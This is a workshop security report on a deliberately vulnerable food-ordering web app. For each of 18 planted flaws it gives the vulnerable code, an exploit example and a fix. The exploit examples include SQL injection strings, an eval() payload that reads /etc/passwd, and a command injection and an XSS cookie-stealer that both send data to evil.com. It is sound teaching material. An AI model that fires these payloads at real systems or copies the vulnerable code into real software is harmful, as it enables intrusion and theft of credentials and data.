# CampusEats — Security Vulnerability Report
> **Workshop use only. Do not deploy.**  
> Every finding below is intentionally planted. All credentials and keys are fake placeholders.

---

## Table of Contents

| # | Vulnerability | Severity | File |
|---|---------------|----------|------|
| 1 | SQL Injection — Login bypass | 🔴 Critical | `routes/auth.js` |
| 2 | SQL Injection — Search | 🔴 Critical | `routes/search.js` |
| 3 | Remote Code Execution via `eval()` — Coupon endpoint | 🔴 Critical | `routes/orders.js` |
| 4 | OS Command Injection — Admin export | 🔴 Critical | `routes/admin.js` |
| 5 | Path Traversal — Receipt file download | 🔴 Critical | `routes/orders.js` |
| 6 | Broken Access Control — Admin panel (no auth check) | 🔴 Critical | `routes/admin.js` |
| 7 | Broken Access Control — Order details (IDOR) | 🟠 High | `routes/orders.js` |
| 8 | Privilege Escalation — User can set own role | 🟠 High | `routes/auth.js`, `views/profile.ejs` |
| 9 | Stored XSS — Product reviews | 🟠 High | `routes/search.js`, `views/product.ejs` |
| 10 | Weak Password Hashing (MD5, unsalted) | 🟠 High | `routes/auth.js` |
| 11 | Insecure Session ID (guessable, timestamp-based) | 🟠 High | `routes/auth.js` |
| 12 | Session Cookie Missing Security Flags | 🟡 Medium | `routes/auth.js` |
| 13 | Cart Price Manipulation (client-trusted price) | 🟡 Medium | `routes/orders.js` |
| 14 | Full Stack Trace & SQL Exposed to User on Error | 🟡 Medium | `server.js`, `views/error.ejs` |
| 15 | Hardcoded Credentials in Source Code | 🟡 Medium | `db.js`, `config.js` |
| 16 | Wildcard CORS (`Access-Control-Allow-Origin: *`) | 🟡 Medium | `server.js` |
| 17 | No CSRF Protection on State-Changing Forms | 🟡 Medium | All routes |
| 18 | `.env` File Committed to Repository | 🟡 Medium | `.env` |

---

## Detailed Findings

---

### 🔴 #1 — SQL Injection: Login Bypass

**File:** [`routes/auth.js`](routes/auth.js) — Line 41–42  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/auth.js  Lines 41-43
const sql = "SELECT * FROM users WHERE username = '" + username +
  "' AND (password = '" + password + "' OR password = '" + md5(password) + "')";
const user = db.get(sql);
```

**Explanation:**  
User-supplied `username` and `password` from the POST body are concatenated directly into a raw SQL string. An attacker can inject arbitrary SQL, completely bypassing the password check.

**Exploit Example:**
```
username: admin'--
password: anything
```
The SQL becomes:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND (password = ...)
```
Everything after `--` is a SQL comment — the password clause is ignored. The attacker logs in as `admin` without knowing the password.

**Correct Fix:**
```js
// Use parameterised queries — NEVER concatenate user input into SQL
router.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Look up user first, then compare password separately
  const user = db.findUserByUsername(username);
  if (!user) {
    return res.status(401).render('login', {
      title: 'Log in',
      error: 'Invalid username or password.',
      next: req.body.next || '/',
    });
  }

  // Compare the stored hash against the submitted password
  const hash = crypto.createHash('sha256').update(password).digest('hex');
  if (user.password !== hash) {
    return res.status(401).render('login', {
      title: 'Log in',
      error: 'Invalid username or password.',
      next: req.body.next || '/',
    });
  }

  startSession(res, user.id);
  res.redirect(req.body.next || '/');
});
```
> `findUserByUsername` already uses a parameterised `?` placeholder, so no injection is possible.

---

### 🔴 #2 — SQL Injection: Search

**File:** [`routes/search.js`](routes/search.js) — Line 11  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/search.js  Line 11
const sql = "SELECT * FROM products WHERE name LIKE '%" + q + "%' OR description LIKE '%" + q + "%'";
```

**Explanation:**  
The search query `q` from `req.query.q` is directly injected into the SQL string without escaping. An attacker can break out of the LIKE clause and run arbitrary SQL — including reading the entire `users` table (passwords included).

**Exploit Example:**
```
GET /search?q=%' UNION SELECT id,username,password,email,address,role FROM users--
```

**Correct Fix:**
```js
// routes/search.js
router.get('/search', (req, res) => {
  const q = (req.query.q || '').trim();
  // Use a parameterised query with LIKE wildcards bound safely
  const pattern = '%' + q + '%';
  const products = q
    ? db.all('SELECT * FROM products WHERE name LIKE ? OR description LIKE ?', pattern, pattern)
    : [];
  res.render('search', { title: 'Search', q: q, products: products });
});
```

---

### 🔴 #3 — Remote Code Execution: `eval()` on Coupon Input

**File:** [`routes/orders.js`](routes/orders.js) — Line 46  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/orders.js  Lines 43-50
router.post('/cart/coupon', (req, res) => {
  const total = subtotalOf(readCart(req));
  try {
    res.json({ subtotal: total, discounted: eval(req.body.coupon) });  // ← DANGER
  } catch (err) {
    res.status(400).json({ error: 'That coupon code is not valid.' });
  }
});
```

**Explanation:**  
`eval()` executes any JavaScript string as code in the server's Node.js process. Any logged-in (or anonymous) user can send an arbitrary JavaScript payload and achieve full Remote Code Execution on the server — reading files, spawning processes, exfiltrating data, etc.

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/cart/coupon \
  -d 'coupon=require("child_process").execSync("cat /etc/passwd").toString()'
```

**Correct Fix:**
```js
// routes/orders.js — replace eval() with a safe, explicit discount lookup
const VALID_COUPONS = {
  WELCOME10: 0.10,   // 10% off
  STUDENT20: 0.20,   // 20% off
  FREESHIP:  0.05,   // 5% off
};

router.post('/cart/coupon', (req, res) => {
  const total = subtotalOf(readCart(req));
  const code  = (req.body.coupon || '').trim().toUpperCase();
  const discount = VALID_COUPONS[code];

  if (discount === undefined) {
    return res.status(400).json({ error: 'That coupon code is not valid.' });
  }

  res.json({ subtotal: total, discounted: total * (1 - discount) });
});
```
> Never use `eval()` / `new Function()` on user-supplied input.

---

### 🔴 #4 — OS Command Injection: Admin Export

**File:** [`routes/admin.js`](routes/admin.js) — Line 22  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/admin.js  Lines 20-26
router.get('/admin/export', (req, res) => {
  const name = req.query.name || 'report';
  exec('node scripts/export-report.js ' + name, { cwd: config.projectDir }, (err, stdout, stderr) => {
    // ...
  });
});
```

**Explanation:**  
The `name` query parameter is appended directly to a shell command string and passed to `child_process.exec`. Since `exec` runs the string through a shell (`/bin/sh`), an attacker can inject shell operators to run any OS command.

**Exploit Example:**
```
GET /admin/export?name=report; cat /etc/passwd
GET /admin/export?name=report && curl https://evil.com/$(whoami)
```

**Correct Fix:**
```js
// routes/admin.js — use execFile with an argument array, never string concatenation
const { execFile } = require('child_process');

router.get('/admin/export', requireAdmin, (req, res) => {
  // Sanitise: only allow safe alphanumeric report names
  const rawName = (req.query.name || 'report').trim();
  const name = rawName.replace(/[^a-zA-Z0-9_-]/g, '');   // whitelist filter

  // execFile does NOT invoke a shell; array args are never interpreted as commands
  execFile('node', ['scripts/export-report.js', name], { cwd: config.projectDir }, (err, stdout, stderr) => {
    if (err) return res.status(500).render('error', { title: 'Export failed', message: stderr || err.message });
    res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: stdout.trim(), name });
  });
});
```

---

### 🔴 #5 — Path Traversal: Receipt File Download

**File:** [`routes/orders.js`](routes/orders.js) — Lines 83–89  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/orders.js  Lines 83-89
router.get('/orders/:id/receipt', requireLogin, (req, res) => {
  const file = req.query.file || 'order-' + req.params.id + '.txt';
  fs.readFile(path.join(config.receiptsDir, file), 'utf8', (err, data) => {
    if (err) return res.status(404).render('error', { ... });
    res.type('text').send(data);
  });
});
```

**Explanation:**  
The `file` query parameter is joined with `config.receiptsDir` without any normalisation or validation. An attacker uses `../` sequences to escape the `receipts/` directory and read arbitrary files on the filesystem.

**Exploit Example:**
```
GET /orders/1/receipt?file=../../.env
GET /orders/1/receipt?file=../../../etc/passwd
GET /orders/1/receipt?file=../../db.js
```

**Correct Fix:**
```js
// routes/orders.js
router.get('/orders/:id/receipt', requireLogin, (req, res) => {
  const defaultFile = 'order-' + req.params.id + '.txt';
  const rawFile = req.query.file || defaultFile;

  // Resolve the absolute path and verify it stays inside receiptsDir
  const receiptsDir = path.resolve(config.receiptsDir);
  const resolved   = path.resolve(receiptsDir, rawFile);

  if (!resolved.startsWith(receiptsDir + path.sep)) {
    return res.status(400).render('error', { title: 'Bad request', message: 'Invalid file path.' });
  }

  fs.readFile(resolved, 'utf8', (err, data) => {
    if (err) return res.status(404).render('error', { title: 'Not found', message: 'Receipt not found.' });
    res.type('text').send(data);
  });
});
```

---

### 🔴 #6 — Broken Access Control: Admin Panel Has No Authentication

**File:** [`routes/admin.js`](routes/admin.js) — Lines 17–26  
**Severity:** Critical  

**Vulnerable Code:**
```js
// routes/admin.js  Lines 17-26
router.get('/admin', (req, res) =>          // ← no auth middleware at all
  res.render('admin', { ... }));

router.get('/admin/export', (req, res) => { // ← no auth middleware at all
  ...
});
```

**Explanation:**  
Both admin routes are completely unprotected. Any visitor — logged in or not — can access `GET /admin` and `GET /admin/export`. There is no check that the user is authenticated or that they have the `admin` role.

**Correct Fix:**
```js
// routes/admin.js — add requireLogin AND requireAdmin guards

function requireAdmin(req, res, next) {
  if (!req.user) return res.redirect('/login?next=/admin');
  if (req.user.role !== 'admin') return res.status(403).render('error', {
    title: 'Forbidden',
    message: 'You do not have permission to access the admin area.',
  });
  next();
}

router.get('/admin', requireAdmin, (req, res) =>
  res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: null, name: '' }));

router.get('/admin/export', requireAdmin, (req, res) => {
  // ... see fix for #4
});
```

---

### 🟠 #7 — Insecure Direct Object Reference (IDOR): Order Details

**File:** [`routes/orders.js`](routes/orders.js) — Lines 76–81  
**Severity:** High  

**Vulnerable Code:**
```js
// routes/orders.js  Lines 76-81
router.get('/orders/:id', requireLogin, (req, res) => {
  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
  if (!order) return notFound(res);
  // ← never checks: does order.user_id === req.user.id ?
  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
  res.render('order', { title: 'Order #' + order.id, order: order, items: items });
});
```

**Explanation:**  
The route fetches an order by its `id` parameter but never verifies that the order belongs to the currently logged-in user. Any authenticated user can view any other user's order by changing the ID in the URL.

**Exploit Example:**
```
# Logged in as 'priya' (userId=2), view rahul's order (userId=3):
GET /orders/2
```

**Correct Fix:**
```js
// routes/orders.js
router.get('/orders/:id', requireLogin, (req, res) => {
  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
  if (!order) return notFound(res);

  // Enforce ownership — admins may bypass this check if needed
  if (order.user_id !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).render('error', { title: 'Forbidden', message: 'That is not your order.' });
  }

  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
  res.render('order', { title: 'Order #' + order.id, order: order, items: items });
});
```

---

### 🟠 #8 — Privilege Escalation: User Can Elevate Own Role

**File:** [`routes/auth.js`](routes/auth.js) — Lines 56–59 and [`views/profile.ejs`](views/profile.ejs) — Line 12  
**Severity:** High  

**Vulnerable Code:**
```js
// routes/auth.js  Lines 56-59
router.post('/profile', requireLogin, (req, res) => {
  db.run('UPDATE users SET email = ?, address = ?, role = ? WHERE id = ?',
    req.body.email, req.body.address, req.body.role, req.user.id);  // ← role from user input!
  res.redirect('/profile?updated=1');
});
```

```html
<!-- views/profile.ejs  Line 12 -->
<input type="hidden" name="role" value="<%= currentUser.role %>">
```

**Explanation:**  
The `role` field is sent as a hidden form input and then written directly to the database. A user can intercept the request (e.g., with browser DevTools or Burp Suite) and change the hidden `role` field from `customer` to `admin`. The server blindly saves whatever role value it receives.

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/profile \
  -H "Cookie: sid=<your_session>" \
  -d "email=priya@example.com&address=Hostel+2&role=admin"
```

**Correct Fix:**
```js
// routes/auth.js — never accept role from the client
router.post('/profile', requireLogin, (req, res) => {
  // Only update fields the user is allowed to change; role is NOT one of them
  db.run('UPDATE users SET email = ?, address = ? WHERE id = ?',
    req.body.email, req.body.address, req.user.id);
  res.redirect('/profile?updated=1');
});
```
```html
<!-- views/profile.ejs — remove the hidden role input entirely -->
<!-- DELETE THIS LINE: <input type="hidden" name="role" value="<%= currentUser.role %>"> -->
```

---

### 🟠 #9 — Stored Cross-Site Scripting (XSS): Product Reviews

**File:** [`views/product.ejs`](views/product.ejs) — Line 24  
**Severity:** High  

**Vulnerable Code:**
```html
<!-- views/product.ejs  Line 24 -->
<p><%- review.body %></p>
```

**Explanation:**  
EJS's `<%-` tag outputs raw, **unescaped** HTML. `<%=` escapes special characters. Because `review.body` is stored exactly as submitted by the user and then rendered with `<%-`, an attacker can store a JavaScript payload in a review that executes in every other visitor's browser (Stored XSS).

**Exploit Example (review body):**
```html
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Correct Fix:**
```html
<!-- views/product.ejs — use <%= (escaped) instead of <%- (raw) -->
<p><%= review.body %></p>
```
> Audit every `<%-` tag across all views. Use `<%-` **only** for trusted, developer-controlled template includes (like `include('partials/header')`).

---

### 🟠 #10 — Weak Password Hashing: MD5 (Unsalted)

**File:** [`routes/auth.js`](routes/auth.js) — Line 8, 30  
**Severity:** High  

**Vulnerable Code:**
```js
// routes/auth.js  Line 8
const md5 = (text) => crypto.createHash('md5').update(text).digest('hex');

// Line 30 — password stored as md5 hash
db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)',
  username, md5(password), ...);
```

**Explanation:**  
MD5 is a fast, cryptographically broken hashing algorithm with no salt. Because it is deterministic and fast, attackers can:
- Look up hashes in pre-computed rainbow tables.
- Crack millions of hashes per second with a GPU.

**Correct Fix:**
```js
// Install bcrypt:  npm install bcrypt
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// When registering:
router.post('/register', async (req, res) => {
  const { username, password, email, address } = req.body;
  if (!username || !password) { /* ... */ }
  if (db.findUserByUsername(username)) { /* ... */ }

  const hash = await bcrypt.hash(password, SALT_ROUNDS);
  const info = db.run('INSERT INTO users (username, password, email, address, role) VALUES (?, ?, ?, ?, ?)',
    username, hash, email || '', address || '', 'customer');
  startSession(res, info.lastInsertRowid);
  res.redirect('/profile');
});

// When logging in:
router.post('/login', async (req, res) => {
  const user = db.findUserByUsername(req.body.username);
  if (!user || !(await bcrypt.compare(req.body.password, user.password))) {
    return res.status(401).render('login', { title: 'Log in', error: 'Invalid username or password.', next: req.body.next || '/' });
  }
  startSession(res, user.id);
  res.redirect(req.body.next || '/');
});
```

---

### 🟠 #11 — Insecure Session ID (Guessable, Timestamp-Based)

**File:** [`routes/auth.js`](routes/auth.js) — Lines 11–13  
**Severity:** High  

**Vulnerable Code:**
```js
// routes/auth.js  Lines 11-13
function startSession(res, userId) {
  const sid = String(Date.now()) + '-' + userId;  // e.g. "1728978462123-2"
  sessions[sid] = { userId: userId, createdAt: Date.now() };
  res.cookie('sid', sid);
}
```

**Explanation:**  
The session ID is composed of a millisecond timestamp and the numeric user ID — both of which are predictable or observable. An attacker who knows (or can guess) approximately when a victim logged in, and knows or can enumerate their user ID, can trivially forge a valid `sid` cookie.

**Correct Fix:**
```js
// routes/auth.js — use cryptographically random session IDs
function startSession(res, userId) {
  const sid = crypto.randomBytes(32).toString('hex');  // 256 bits of entropy
  sessions[sid] = { userId: userId, createdAt: Date.now() };
  res.cookie('sid', sid, {
    httpOnly: true,
    sameSite: 'lax',
    // secure: true,   // uncomment when serving over HTTPS
    maxAge: 8 * 60 * 60 * 1000,  // 8 hours
  });
}
```

---

### 🟡 #12 — Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags

**File:** [`routes/auth.js`](routes/auth.js) — Line 13  
**Severity:** Medium  

**Vulnerable Code:**
```js
// routes/auth.js  Line 13
res.cookie('sid', sid);   // no flags set
```

**Explanation:**  
Without `HttpOnly`, the session cookie is accessible via `document.cookie` in JavaScript — making it trivially stealable by any XSS payload. Without `SameSite`, the cookie is sent with cross-site requests (CSRF risk). Without `Secure`, the cookie may be transmitted over plain HTTP.

**Correct Fix:**
```js
// See fix in #11 above — same cookie options apply
res.cookie('sid', sid, {
  httpOnly: true,   // not readable by JavaScript
  sameSite: 'lax', // not sent on cross-origin POSTs
  // secure: true,  // only over HTTPS
  maxAge: 8 * 60 * 60 * 1000,
});
```

---

### 🟡 #13 — Cart Price Manipulation (Client-Trusted Price at Checkout)

**File:** [`routes/orders.js`](routes/orders.js) — Lines 52–68  
**Severity:** Medium  

**Vulnerable Code:**
```js
// routes/orders.js  Lines 52-68
router.post('/checkout', requireLogin, (req, res) => {
  let items = [];
  try {
    items = JSON.parse(req.body.cart || '[]');  // ← cart comes from the client
  } catch (err) { items = []; }

  // Total is calculated using client-supplied prices — not DB prices
  const total = items.reduce((sum, item) => sum + item.price * item.qty, 0);
  // ...
});
```

**Explanation:**  
The entire cart (including item `price` fields) is sent by the browser as a hidden `<input>` in the checkout form. Anyone can edit those values in DevTools or with a `curl` request to order items at an arbitrary price (e.g., $0.01 or even negative).

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/checkout \
  -H "Cookie: sid=<your_session>" \
  -d 'cart=[{"id":7,"name":"Veg Thali","price":0.01,"qty":1}]'
```

**Correct Fix:**
```js
// routes/orders.js — always re-fetch prices from the database, never trust the client
router.post('/checkout', requireLogin, (req, res) => {
  let items = [];
  try { items = JSON.parse(req.body.cart || '[]'); } catch { items = []; }
  if (!items.length) return res.redirect('/cart');

  let total = 0;
  const verifiedItems = [];
  for (const item of items) {
    const product = db.get('SELECT * FROM products WHERE id = ?', item.id);
    if (!product) continue;  // skip unknown products
    const qty = Math.max(1, parseInt(item.qty, 10) || 1);
    total += product.price * qty;
    verifiedItems.push({ id: product.id, name: product.name, price: product.price, qty });
  }

  if (!verifiedItems.length) return res.redirect('/cart');

  const order = db.run('INSERT INTO orders (user_id, total, status, created_at) VALUES (?, ?, ?, ?)',
    req.user.id, total, 'paid', new Date().toISOString());
  for (const item of verifiedItems) {
    db.run('INSERT INTO order_items (order_id, product_id, name, price, qty) VALUES (?, ?, ?, ?, ?)',
      order.lastInsertRowid, item.id, item.name, item.price, item.qty);
  }
  res.cookie('cart', JSON.stringify([]));
  res.redirect('/orders/' + order.lastInsertRowid);
});
```

---

### 🟡 #14 — Full Stack Trace and SQL Query Exposed to End Users

**File:** [`server.js`](server.js) — Lines 55–63 and [`views/error.ejs`](views/error.ejs) — Lines 7–15  
**Severity:** Medium  

**Vulnerable Code:**
```js
// server.js  Lines 55-63
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).render('error', {
    title: 'Something broke',
    message: err.message,
    stack: err.stack,      // ← full Node.js stack trace sent to browser
    sql: err.sql || '',    // ← raw SQL query sent to browser
  });
});
```

**Explanation:**  
Stack traces and raw SQL strings reveal internal implementation details — file paths, library versions, table names, column names, query structure — giving attackers a detailed blueprint for further attacks. Triggering the SQL error path (e.g., via SQLi) also echoes back the injected query.

**Correct Fix:**
```js
// server.js — log details server-side only; send generic message to client
app.use((err, req, res, next) => {
  // Log full details to server logs (never to the client)
  console.error('[ERROR]', err.stack);
  if (err.sql) console.error('[SQL]', err.sql);

  res.status(500).render('error', {
    title: 'Something went wrong',
    message: 'An unexpected error occurred. Please try again later.',
    stack: '',   // never expose
    sql: '',     // never expose
  });
});
```

---

### 🟡 #15 — Hardcoded Credentials and Plaintext Passwords in Source Code

**File:** [`db.js`](db.js) — Lines 6–12  
**Severity:** Medium  

**Vulnerable Code:**
```js
// db.js  Lines 6-12
const USERS = [
  ['admin', 'admin123',    'admin@example.com', 'Admin Office, Block A', 'admin'],
  ['priya', 'password123', 'priya@example.com', 'Hostel 2, Room 214',   'customer'],
  ['rahul', 'rahul@123',   'rahul@example.com', 'Hostel 1, Room 108',   'customer'],
  ...
];
```

**Explanation:**  
Plaintext passwords committed to a repository are visible to anyone with repo access (and in git history forever). Even though these are labelled as fake, the pattern teaches bad habits and would be disastrous with real credentials.

**Correct Fix:**
```js
// db.js — seed with properly hashed passwords; never store or commit plaintext passwords
// Pre-generate hashes with: node -e "console.log(require('bcrypt').hashSync('admin123', 12))"
const USERS = [
  ['admin', '$2b$12$exampleHashForAdmin...', 'admin@example.com', 'Admin Office, Block A', 'admin'],
  ['priya', '$2b$12$exampleHashForPriya...', 'priya@example.com', 'Hostel 2, Room 214',   'customer'],
  // ...
];
// Add to .gitignore: any file with real credentials or secrets
```

---

### 🟡 #16 — Wildcard CORS (`Access-Control-Allow-Origin: *`)

**File:** [`server.js`](server.js) — Line 18  
**Severity:** Medium  

**Vulnerable Code:**
```js
// server.js  Line 18
app.use(cors());   // defaults to Access-Control-Allow-Origin: *
```

**Explanation:**  
With a wildcard CORS policy, any website on the internet can make cross-origin requests to this server and read the responses. This can be combined with other bugs (like missing CSRF protection) to extract sensitive data from authenticated sessions.

**Correct Fix:**
```js
// server.js — restrict CORS to known, trusted origins
app.use(cors({
  origin: ['http://localhost:3000'],   // add your real production domain here
  credentials: true,                   // required if cookies are sent cross-origin
}));
```

---

### 🟡 #17 — No CSRF Protection on State-Changing Forms

**File:** All route handlers (`routes/auth.js`, `routes/orders.js`, etc.)  
**Severity:** Medium  

**Explanation:**  
There are no CSRF tokens on any of the POST forms (profile update, checkout, logout, etc.). A malicious website can silently trigger state-changing requests on behalf of a logged-in victim. This is especially dangerous combined with #16 (open CORS).

**Correct Fix:**
```js
// Install: npm install csurf
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply globally in server.js
app.use(csrfProtection);

// Pass csrfToken to every view:
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});
```
```html
<!-- Add to every form in every .ejs view -->
<input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

---

### 🟡 #18 — `.env` File Committed to the Repository

**File:** [`.env`](.env)  
**Severity:** Medium  

**Vulnerable Code:**
```
# .env
HOST=127.0.0.1
PORT=3000
SESSION_SECRET=FAKE-session-secret-do-not-use-this-value
DB_PASSWORD=FAKE-db-password-not-a-real-password
```

**Explanation:**  
The `.env` file is tracked by git and thus committed to the repository history. In a real project this would expose secrets to everyone with repo access, and the secrets would remain accessible in `git log` even after deletion. `.env` files must always be in `.gitignore`.

**Correct Fix:**
```bash
# 1. Remove .env from git tracking (do NOT delete the file itself)
echo ".env" >> .gitignore
git rm --cached .env
git commit -m "chore: stop tracking .env"

# 2. Provide a .env.example with dummy values for documentation
cp .env .env.example
# Edit .env.example to replace real values with obvious placeholders
git add .env.example
git commit -m "chore: add .env.example template"
```

---

## Summary Table

| # | Vulnerability | CWE | OWASP Top 10 (2021) |
|---|---------------|-----|---------------------|
| 1 | SQL Injection — Login | CWE-89 | A03: Injection |
| 2 | SQL Injection — Search | CWE-89 | A03: Injection |
| 3 | RCE via `eval()` | CWE-95 | A03: Injection |
| 4 | OS Command Injection | CWE-78 | A03: Injection |
| 5 | Path Traversal | CWE-22 | A01: Broken Access Control |
| 6 | Missing Admin Auth | CWE-862 | A01: Broken Access Control |
| 7 | IDOR on Orders | CWE-639 | A01: Broken Access Control |
| 8 | Privilege Escalation | CWE-269 | A01: Broken Access Control |
| 9 | Stored XSS | CWE-79 | A03: Injection |
| 10 | Weak Hashing (MD5) | CWE-916 | A02: Cryptographic Failures |
| 11 | Guessable Session ID | CWE-330 | A07: Identification & Auth Failures |
| 12 | Insecure Cookie Flags | CWE-614 | A02: Cryptographic Failures |
| 13 | Client-Trusted Price | CWE-20 | A04: Insecure Design |
| 14 | Stack Trace Disclosure | CWE-209 | A05: Security Misconfiguration |
| 15 | Hardcoded Credentials | CWE-798 | A02: Cryptographic Failures |
| 16 | Wildcard CORS | CWE-942 | A05: Security Misconfiguration |
| 17 | No CSRF Protection | CWE-352 | A01: Broken Access Control |
| 18 | `.env` in Repo | CWE-312 | A02: Cryptographic Failures |

---

*Report generated for educational purposes — CampusEats Security Workshop.*
